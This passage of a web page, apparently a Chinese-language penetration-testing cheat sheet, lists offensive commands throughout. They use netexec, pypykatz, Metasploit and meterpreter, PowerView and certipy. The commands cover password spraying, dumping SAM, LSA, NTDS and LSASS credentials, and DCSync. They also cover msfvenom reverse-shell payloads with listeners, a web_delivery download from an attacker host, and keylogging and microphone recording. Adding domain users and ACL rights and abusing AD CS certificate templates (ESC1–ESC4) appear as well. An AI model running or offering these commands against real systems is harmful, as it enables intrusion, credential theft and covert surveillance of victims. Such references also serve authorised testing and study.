-p &quot;&quot; --shares -M spider_plus -o READ_ONLY=false</span><br><span class="hljs-string">netexec smb &lt;RHOST&gt; -u &quot; &quot; -p &quot;&quot; --shares -M spider_plus -o DOWNLOAD_FLAG=True</span><br><span class="hljs-string">netexec smb &lt;RHOST&gt; -u &quot; &quot; -p &quot;&quot; --shares -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=99999999</span><br><span class="hljs-string">netexec smb &lt;RHOST&gt; -u guest -p &#x27;</span><span class="hljs-string">&#x27; --shares --rid-brute</span><br><span class="hljs-string">netexec smb &lt;RHOST&gt; -u guest -p &#x27;</span><span class="hljs-string">&#x27; --shares --rid-brute 100000</span><br><span class="hljs-string">netexec smb &lt;RHOST&gt; -u &quot;guest&quot; -p &quot;&quot; --shares --rid-brute</span><br><span class="hljs-string">netexec smb &lt;RHOST&gt; -u &quot;guest&quot; -p &quot;&quot; --shares --rid-brute 100000</span><br><span class="hljs-string">netexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; --use-kcache --sam</span><br><span class="hljs-string">netexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; --shares</span><br><span class="hljs-string">netexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; --sam</span><br><span class="hljs-string">netexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; --lsa</span><br><span class="hljs-string">netexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; --dpapi</span><br><span class="hljs-string">netexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; --local-auth --sam</span><br><span class="hljs-string">netexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; --local-auth --lsa</span><br><span class="hljs-string">netexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; --local-auth --dpapi</span><br><span class="hljs-string">netexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; -M lsassy</span><br><span class="hljs-string">netexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; -M web_delivery -o URL=http://&lt;LHOST&gt;/&lt;FILE&gt;</span><br><span class="hljs-string">netexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; --ntds</span><br><span class="hljs-string">netexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -H &quot;&lt;NTLMHASH&gt;&quot; --ntds</span><br><span class="hljs-string">netexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; --ntds --user &lt;USERNAME&gt;</span><br><span class="hljs-string">netexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -H &quot;&lt;NTLMHASH&gt;&quot; --ntds --user &lt;USERNAME&gt;</span><br><span class="hljs-string">netexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -H &lt;HASH&gt; -x &quot;whoami&quot;</span><br><span class="hljs-string">netexec ldap &lt;RHOST&gt; -u &#x27;</span><span class="hljs-string">&#x27; -p &#x27;</span><span class="hljs-string">&#x27; -M get-desc-users</span><br><span class="hljs-string">netexec ldap &lt;RHOST&gt; -u &quot;&quot; -p &quot;&quot; -M get-desc-users</span><br><span class="hljs-string">netexec ldap &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; --gmsa</span><br><span class="hljs-string">netexec ldap &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; --gmsa -k</span><br><span class="hljs-string">netexec ldap &lt;RHOST&gt; -u &#x27;</span>&lt;USERNAME&gt;<span class="hljs-string">&#x27; -p &#x27;</span>&lt;PASSWORD&gt;<span class="hljs-string">&#x27; --bloodhound -ns &lt;RHOST&gt; -c all</span><br><span class="hljs-string">netexec ldap &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; --bloodhound -ns &lt;RHOST&gt; -c all</span><br><span class="hljs-string">netexec winrm &lt;SUBNET&gt;/24 -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; -d .</span><br><span class="hljs-string">netexec winrm -u /t -p &quot;&lt;PASSWORD&gt;&quot; -d &lt;DOMAIN&gt; &lt;RHOST&gt;</span><br><span class="hljs-string">netexec winrm &lt;RHOST&gt; -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt</span><br><span class="hljs-string">netexec winrm &lt;RHOST&gt; -u &#x27;</span>&lt;USERNAME&gt;<span class="hljs-string">&#x27; -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding</span><br><span class="hljs-string">netexec &lt;PROTOCOL&gt; &lt;RHOST&gt; -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --shares</span><br><span class="hljs-string">netexec &lt;PROTOCOL&gt; &lt;RHOST&gt; -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --pass-pol</span><br><span class="hljs-string">netexec &lt;PROTOCOL&gt; &lt;RHOST&gt; -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --lusers</span><br><span class="hljs-string">netexec &lt;PROTOCOL&gt; &lt;RHOST&gt; -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --sam</span><br><span class="hljs-string">netexec &lt;PROTOCOL&gt; &lt;RHOST&gt; -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -x &#x27;</span>net user Administrator /domain<span class="hljs-number">&#x27;</span> --exec-method smbexec<br>netexec &lt;PROTOCOL&gt; &lt;RHOST&gt; -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --wdigest enable<br>netexec &lt;PROTOCOL&gt; &lt;RHOST&gt; -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -x <span class="hljs-string">&#x27;quser&#x27;</span><br></code></pre></td></tr></table></figure>

<h4 id="pypykatz"><a href="#pypykatz" class="headerlink" title="pypykatz"></a>pypykatz</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">pypykatz lsa minidump lsass.dmp<br>pypykatz registry --sam sam system<br></code></pre></td></tr></table></figure>

<h3 id="漏洞利用工具-1"><a href="#漏洞利用工具-1" class="headerlink" title="漏洞利用工具"></a>漏洞利用工具</h3><h4 id="msfasploit"><a href="#msfasploit" class="headerlink" title="msfasploit"></a>msfasploit</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs c">$ sudo msfdb run                   <span class="hljs-comment">// start database</span><br>$ sudo msfdb init                  <span class="hljs-comment">// 数据库初始化</span><br>$ msfdb --use-defaults delete      <span class="hljs-comment">// 删除现有数据库</span><br>$ msfdb --use-defaults init        <span class="hljs-comment">// 数据库初始化</span><br>$ msfdb status                     <span class="hljs-comment">// database status</span><br>msf6 &gt; workspace                   <span class="hljs-comment">// metasploit工作空间</span><br>msf6 &gt; workspace -a &lt;WORKSPACE&gt;    <span class="hljs-comment">// add a workspace</span><br>msf6 &gt; workspace -r &lt;WORKSPACE&gt;    <span class="hljs-comment">// rename a workspace</span><br>msf6 &gt; workspace -d &lt;WORKSPACE&gt;    <span class="hljs-comment">// delete a workspace</span><br>msf6 &gt; workspace -D                <span class="hljs-comment">// delete all workspaces</span><br>msf6 &gt; db_nmap &lt;OPTIONS&gt;           <span class="hljs-comment">// 执行nmap并将输出添加到数据库</span><br>msf6 &gt; hosts                       <span class="hljs-comment">// reads hosts from database</span><br>msf6 &gt; services                    <span class="hljs-comment">// reads services from database</span><br>msf6 &gt; vulns                       <span class="hljs-comment">// 显示漏洞</span><br>msf6 &gt; search                      <span class="hljs-comment">// search within metasploit</span><br>msf6 &gt; <span class="hljs-built_in">set</span> RHOST &lt;RHOST&gt;           <span class="hljs-comment">// set remote host</span><br>msf6 &gt; <span class="hljs-built_in">set</span> RPORT &lt;RPORT&gt;           <span class="hljs-comment">// set remote port</span><br>msf6 &gt; run                         <span class="hljs-comment">// run exploit</span><br>msf6 &gt; spool /PATH/TO/FILE         <span class="hljs-comment">// 记录屏幕输出</span><br>msf6 &gt; save                        <span class="hljs-comment">// saves current state</span><br>msf6 &gt; exploit                     <span class="hljs-comment">// using module exploit</span><br>msf6 &gt; payload                     <span class="hljs-comment">// using module payload</span><br>msf6 &gt; auxiliary                   <span class="hljs-comment">// using module auxiliary</span><br>msf6 &gt; encoder                     <span class="hljs-comment">// using module encoder</span><br>msf6 &gt; nop                         <span class="hljs-comment">// using module nop</span><br>msf6 &gt; show sessions               <span class="hljs-comment">// 显示所有当前会话</span><br>msf6 &gt; sessions -i <span class="hljs-number">1</span>               <span class="hljs-comment">// switch to session 1</span><br>msf6 &gt; sessions -u &lt;ID&gt;            <span class="hljs-comment">// 将shell升级为meterpreter</span><br>msf6 &gt; sessions -k &lt;ID&gt;            <span class="hljs-comment">// 终止特定会话</span><br>msf6 &gt; sessions -K                 <span class="hljs-comment">// kill all sessions</span><br>msf6 &gt; jobs                        <span class="hljs-comment">// 显示所有当前作业</span><br>msf6 &gt; show payloads               <span class="hljs-comment">// 显示可用有效载荷</span><br>msf6 &gt; <span class="hljs-built_in">set</span> VERBOSE <span class="hljs-literal">true</span>            <span class="hljs-comment">// 启用详细输出</span><br>msf6 &gt; <span class="hljs-built_in">set</span> forceexploit <span class="hljs-literal">true</span>       <span class="hljs-comment">// 无论如何都会利用目标</span><br>msf6 &gt; <span class="hljs-built_in">set</span> EXITFUNC thread         <span class="hljs-comment">// 反向shell可以在不退出程序的情况下退出</span><br>msf6 &gt; <span class="hljs-built_in">set</span> AutoLoadStdapi <span class="hljs-literal">false</span>    <span class="hljs-comment">// 禁用stdapi的自动加载</span><br>msf6 &gt; <span class="hljs-built_in">set</span> PrependMigrate <span class="hljs-literal">true</span>     <span class="hljs-comment">// 启用自动进程迁移</span><br>msf6 &gt; <span class="hljs-built_in">set</span> PrependMigrateProc explorer.exe                        <span class="hljs-comment">// 自动迁移到explorer.exe</span><br>msf6 &gt; use post/PATH/TO/MODULE                                    <span class="hljs-comment">// use post exploitation module</span><br>msf6 &gt; use post/linux/gather/hashdump                             <span class="hljs-comment">// use hashdump for Linux</span><br>msf6 &gt; use post/multi/manage/shell_to_meterpreter                 <span class="hljs-comment">// shell to meterpreter</span><br>msf6 &gt; use exploit/windows/http/oracle_event_processing_upload    <span class="hljs-comment">// 使用特定模块</span><br>C:\&gt; &gt; Ctrl + z                                  <span class="hljs-comment">// 将活动meterpreter外壳置于背景中</span><br>meterpreter &gt; loadstdapi                         <span class="hljs-comment">// 加载stdapi</span><br>meterpreter &gt; background                         <span class="hljs-comment">// 将meterpreter置于后台（与“bg”相同）</span><br>meterpreter &gt; shell                              <span class="hljs-comment">// get a system shell</span><br>meterpreter &gt; channel -i &lt;ID&gt;                    <span class="hljs-comment">// 返回到现有的meterpreter外壳</span><br>meterpreter &gt; ps                                 <span class="hljs-comment">// 检查过程</span><br>meterpreter &gt; migrate <span class="hljs-number">2236</span>                       <span class="hljs-comment">// 迁移到进程</span><br>meterpreter &gt; getuid                             <span class="hljs-comment">// get the user id</span><br>meterpreter &gt; sysinfo                            <span class="hljs-comment">// get system information</span><br>meterpreter &gt; search -f &lt;FILE&gt;                   <span class="hljs-comment">// search for a file</span><br>meterpreter &gt; upload                             <span class="hljs-comment">// 将本地文件上载到目标</span><br>meterpreter &gt; ipconfig                           <span class="hljs-comment">// 获取网络配置</span><br>meterpreter &gt; load powershell                    <span class="hljs-comment">// loads powershell</span><br>meterpreter &gt; powershell_shell                   <span class="hljs-comment">// load powershell的后续命令</span><br>meterpreter &gt; powershell_execute                 <span class="hljs-comment">// execute命令</span><br>meterpreter &gt; powershell_import                  <span class="hljs-comment">// import module</span><br>meterpreter &gt; powershell_shell                   <span class="hljs-comment">// shell</span><br>meterpreter &gt; powershell_session_remove          <span class="hljs-comment">// remove</span><br>meterpreter &gt; powershell_execute <span class="hljs-string">&#x27;Get-NetNeighbor | Where-Object -Property State -NE &quot;Unreachable&quot; | Select-Object -Property IPAddress&#x27;</span>                                <span class="hljs-comment">// network discovery</span><br>meterpreter &gt; powershell_execute <span class="hljs-string">&#x27;1..254 | foreach &#123; &quot;&lt;XXX.XXX.XXX&gt;.$&#123;_&#125;: $(Test-Connection -TimeoutSeconds 1 -Count 1 -ComputerName &lt;XXX.XXX.XXX&gt;.$&#123;_&#125; -Quiet)&quot; &#125;&#x27;</span>    <span class="hljs-comment">// network scan</span><br>meterpreter &gt; powershell_execute <span class="hljs-string">&#x27;Test-NetConnection -ComputerName &lt;RHOST&gt; -Port 80 | Select-Object -Property RemotePort, TcpTestSucceeded&#x27;</span>                            <span class="hljs-comment">// port scan</span><br>meterpreter &gt; load kiwi                          <span class="hljs-comment">// load mimikatz</span><br>meterpreter &gt; help kiwi                          <span class="hljs-comment">// mimikatz help</span><br>meterpreter &gt; kiwi_cmd                           <span class="hljs-comment">// execute mimikatz native command</span><br>meterpreter &gt; lsa_dump_sam                       <span class="hljs-comment">// lsa sam dump</span><br>meterpreter &gt; dcsync_ntlm krbtgt                 <span class="hljs-comment">// dc sync</span><br>meterpreter &gt; creds_all                          <span class="hljs-comment">// dump all credentials</span><br>meterpreter &gt; creds_msv                          <span class="hljs-comment">// msv dump</span><br>meterpreter &gt; creds_kerberos                     <span class="hljs-comment">// kerberos dump</span><br>meterpreter &gt; creds_ssp                          <span class="hljs-comment">// ssp dump</span><br>meterpreter &gt; creds_wdigest                      <span class="hljs-comment">// wdigest dump</span><br>meterpreter &gt; getprivs                           <span class="hljs-comment">// 加载mimikatz后获得特权</span><br>meterpreter &gt; getsystem                          <span class="hljs-comment">// 如果用户是管理员组的成员，则获得系统权限</span><br>meterpreter &gt; hashdump                           <span class="hljs-comment">// dumps all the user hashes</span><br>meterpreter &gt; run post/windows/gather/checkvm    <span class="hljs-comment">// check status of the target</span><br>meterpreter &gt; run post/multi/recon/local_exploit_suggester    <span class="hljs-comment">// checking for exploits</span><br>meterpreter &gt; run post/windows/manage/enable_rdp              <span class="hljs-comment">// enables rdp</span><br>meterpreter &gt; run post/multi/manage/autoroute                 <span class="hljs-comment">// runs autoroutes</span><br>meterpreter &gt; run auxiliary/server/socks4a                    <span class="hljs-comment">// runs socks4 proxy server</span><br>meterpreter &gt; keyscan_start                                   <span class="hljs-comment">// enabled keylogger</span><br>meterpreter &gt; keyscan_dump                                    <span class="hljs-comment">// showing the output</span><br>meterpreter &gt; screenshare                                     <span class="hljs-comment">// realtime screen sharing</span><br>meterpreter &gt; screenshare -q <span class="hljs-number">100</span>                              <span class="hljs-comment">// realtime screen sharing</span><br>meterpreter &gt; record_mic                                      <span class="hljs-comment">// recording mic output</span><br>meterpreter &gt; timestomp                                       <span class="hljs-comment">// modify timestamps</span><br>meterpreter &gt; execute -f calc.exe                             <span class="hljs-comment">// starts a program on the victim</span><br>meterpreter &gt; portfwd add -l &lt;LPORT&gt; -p &lt;RPORT&gt; -r <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>    <span class="hljs-comment">// port forwarding</span><br></code></pre></td></tr></table></figure>

<h5 id="通过代理服务器登录METASPLOIT工具"><a href="#通过代理服务器登录METASPLOIT工具" class="headerlink" title="通过代理服务器登录METASPLOIT工具"></a>通过代理服务器登录METASPLOIT工具</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">proxychains -q msfconsole<br></code></pre></td></tr></table></figure>

<h5 id="辅助输出目录"><a href="#辅助输出目录" class="headerlink" title="辅助输出目录"></a>辅助输出目录</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">/home/&lt;USERNAME&gt;/.msf4/loot/<span class="hljs-number">20200623090635</span>_default_&lt;RHOST&gt;_nvms.traversal_680948.txt<br></code></pre></td></tr></table></figure>

<h5 id="Meterpreter监听器"><a href="#Meterpreter监听器" class="headerlink" title="Meterpreter监听器"></a>Meterpreter监听器</h5><h6 id="生成有效负载"><a href="#生成有效负载" class="headerlink" title="生成有效负载"></a>生成有效负载</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;LHOST&gt; LPORT=&lt;LPORT&gt; -f exe -o meterpreter_payload.exe<br></code></pre></td></tr></table></figure>

<h6 id="为-Microsoft-Windows-设置监听器"><a href="#为-Microsoft-Windows-设置监听器" class="headerlink" title="为 Microsoft Windows 设置监听器"></a>为 Microsoft Windows 设置监听器</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">msf6 &gt; use exploit/multi/handler<br>[*] Using configured payload generic/shell_reverse_tcp<br>msf6 <span class="hljs-title function_">exploit</span><span class="hljs-params">(multi/handler)</span> &gt; <span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br>payload =&gt; windows/x64/meterpreter/reverse_tcp<br>msf6 <span class="hljs-title function_">exploit</span><span class="hljs-params">(multi/handler)</span> &gt; <span class="hljs-built_in">set</span> LHOST &lt;LHOST&gt;<br>LHOST =&gt; &lt;LHOST&gt;<br>msf6 <span class="hljs-title function_">exploit</span><span class="hljs-params">(multi/handler)</span> &gt; <span class="hljs-built_in">set</span> LPORT &lt;LPORT&gt;<br>LPORT =&gt; &lt;LPORT&gt;<br>msf6 <span class="hljs-title function_">exploit</span><span class="hljs-params">(multi/handler)</span> &gt; run<br></code></pre></td></tr></table></figure>

<h6 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;LHOST&gt; LPORT=&lt;LPORT&gt; -f exe -o &lt;FILE&gt;.exe<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">msf6 &gt; use exploit/multi/handler<br>[*] Using configured payload generic/shell_reverse_tcp<br>msf6 <span class="hljs-title function_">exploit</span><span class="hljs-params">(multi/handler)</span> &gt; <span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br>payload =&gt; windows/x64/meterpreter/reverse_tcp<br>msf6 <span class="hljs-title function_">exploit</span><span class="hljs-params">(multi/handler)</span> &gt; <span class="hljs-built_in">set</span> LHOST &lt;LHOST&gt;<br>LHOST =&gt; &lt;LHOST&gt;<br>msf6 <span class="hljs-title function_">exploit</span><span class="hljs-params">(multi/handler)</span> &gt; <span class="hljs-built_in">set</span> LPORT &lt;LPORT&gt;<br>LPORT =&gt; &lt;LPORT&gt;<br>msf6 <span class="hljs-title function_">exploit</span><span class="hljs-params">(multi/handler)</span> &gt; run<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">.\&lt;FILE&gt;.exe<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">meterpreter &gt; download *<br></code></pre></td></tr></table></figure>

<h3 id="域环境或内网环境的后利用技巧"><a href="#域环境或内网环境的后利用技巧" class="headerlink" title="域环境或内网环境的后利用技巧"></a>域环境或内网环境的后利用技巧</h3><h4 id="账户操作员小组成员资格"><a href="#账户操作员小组成员资格" class="headerlink" title="账户操作员小组成员资格"></a>账户操作员小组成员资格</h4><h5 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">net user &lt;USERNAME&gt; &lt;PASSWORD&gt; /add /domain<br>net group <span class="hljs-string">&quot;Exchange Windows Permissions&quot;</span> /add &lt;USERNAME&gt;<br></code></pre></td></tr></table></figure>

<h5 id="导入PowerView"><a href="#导入PowerView" class="headerlink" title="导入PowerView"></a>导入PowerView</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">powershell -ep bypass<br>. .\PowerView.ps1<br></code></pre></td></tr></table></figure>

<h5 id="添加-DCSync-权限"><a href="#添加-DCSync-权限" class="headerlink" title="添加 DCSync 权限"></a>添加 DCSync 权限</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">$pass = convertto-securestring <span class="hljs-string">&#x27;&lt;PASSWORD&gt;&#x27;</span> -AsPlainText -Force<br>$cred = New-Object System.Management.Automation.PSCredential(<span class="hljs-string">&#x27;&lt;DOMAIN&gt;\&lt;USERNAME&gt;&#x27;</span>, $pass)<br>Add-DomainObjectAcl -Credential $cred -TargetIdentity <span class="hljs-string">&quot;DC=&lt;DOMAIN&gt;,DC=local&quot;</span> -PrincipalIdentity &lt;USERNAME&gt; -Rights DCSync<br></code></pre></td></tr></table></figure>

<h5 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-secretsdump <span class="hljs-string">&#x27;&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;RHOST&gt;&#x27;</span><br></code></pre></td></tr></table></figure>

<h4 id="Active-Directory-证书服务-AD-CS"><a href="#Active-Directory-证书服务-AD-CS" class="headerlink" title="Active Directory 证书服务 (AD CS)"></a>Active Directory 证书服务 (AD CS)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">certipy find -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -dc-ip &lt;RHOST&gt; -vulnerable -<span class="hljs-built_in">stdout</span><br></code></pre></td></tr></table></figure>

<h5 id="ESC1：证书模板配置错误"><a href="#ESC1：证书模板配置错误" class="headerlink" title="ESC1：证书模板配置错误"></a>ESC1：证书模板配置错误</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">certipy req -ca <span class="hljs-string">&#x27;&lt;CA&gt;&#x27;</span> -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -target &lt;CA&gt; -template &lt;TEMPLATE&gt; -upn administrator@&lt;DOMAIN&gt; -dns &lt;RHOST&gt;<br>certipy auth -pfx administrator.pfx -dc-ip &lt;RHOST&gt;<br></code></pre></td></tr></table></figure>

<h5 id="ESC2：证书模板配置错误"><a href="#ESC2：证书模板配置错误" class="headerlink" title="ESC2：证书模板配置错误"></a>ESC2：证书模板配置错误</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">certipy req -ca <span class="hljs-string">&#x27;&lt;CA&gt;&#x27;</span> -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -target &lt;CA&gt; -template &lt;TEMPLATE&gt;<br>certipy req -ca <span class="hljs-string">&#x27;&lt;CA&gt;&#x27;</span> -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -target &lt;CA&gt; -template User -on-behalf-of <span class="hljs-string">&#x27;&lt;DOMAIN&gt;\Administrator&#x27;</span> -pfx &lt;USERNAME&gt;.pfx<br>certipy auth -pfx administrator.pfx -dc-ip &lt;RHOST&gt;<br></code></pre></td></tr></table></figure>

<h5 id="ESC3：注册代理模板"><a href="#ESC3：注册代理模板" class="headerlink" title="ESC3：注册代理模板"></a>ESC3：注册代理模板</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">certipy req -ca <span class="hljs-string">&#x27;&lt;CA&gt;&#x27;</span> -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -target &lt;CA&gt; -template &lt;TEMPLATE&gt;<br>certipy req -ca <span class="hljs-string">&#x27;&lt;CA&gt;&#x27;</span> -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -target &lt;CA&gt; -template User -on-behalf-of <span class="hljs-string">&#x27;&lt;DOMAIN&gt;\Administrator&#x27;</span> -pfx &lt;USERNAME&gt;.pfx<br>certipy auth -pfx administrator.pfx -dc-ip &lt;RHOST&gt;<br></code></pre></td></tr></table></figure>

<h5 id="ESC4：存在漏洞的证书模板访问控制"><a href="#ESC4：存在漏洞的证书模板访问控制" class="headerlink" title="ESC4：存在漏洞的证书模板访问控制"></a>ESC4：存在漏洞的证书模板访问控制</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">certipy template -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -template &lt;TEMPLAET&gt; -save-old<br>certipy req -ca <span class="hljs-string">&#x27;&lt;CA&gt;&#x27;</span> -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -target &lt;CA&gt; -template &lt;TEMPLATE&gt; -upn administrator@&lt;DOMAIN&gt;<br>certipy auth -pfx administrator.pfx -dc-ip &lt;RHOST&gt;<br></code></pre></td></tr></table></figure>

